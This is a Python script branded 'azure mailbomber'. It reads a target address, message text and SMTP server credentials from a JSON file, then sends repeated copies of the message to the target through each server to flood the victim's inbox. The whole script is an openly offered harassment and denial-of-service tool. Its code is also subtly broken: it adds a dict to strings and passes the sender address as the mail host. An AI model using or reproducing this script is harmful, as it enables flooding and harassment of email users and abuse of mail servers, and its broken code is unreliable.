from pyfiglet import figlet_format
from termcolor import colored
from colorama import init
from time import sleep
import json
import smtplib

init()

print(colored(figlet_format("azure mailbomber"), "cyan"))

config = json.load(open('smtp.json', 'r'))

content = config["content"]
target = config["target"]
servers = config["servers"]

print(colored("[+] Loaded config.", "green"))

for server in servers:
    print(colored("[+] Initializing SMTP for " + server + ".", "green"))
    port = server["port"]
    mails = server["mails"]
    sender = server["sender"]
    security_key = server["security_key"]
    with smtplib.SMTP(sender, port) as smtpserver:
        smtpserver.ehlo()
        smtpserver.starttls()
        smtpserver.ehlo()
        smtpserver.login(sender, security_key)
        for i in range(mails):
            smtpserver.sendmail(sender, target, content)
            print(colored("[+] Sent mail from " + server + ".", "green"))

print(colored("Mailbomb job finished.", "light_red"))
sleep(9999)
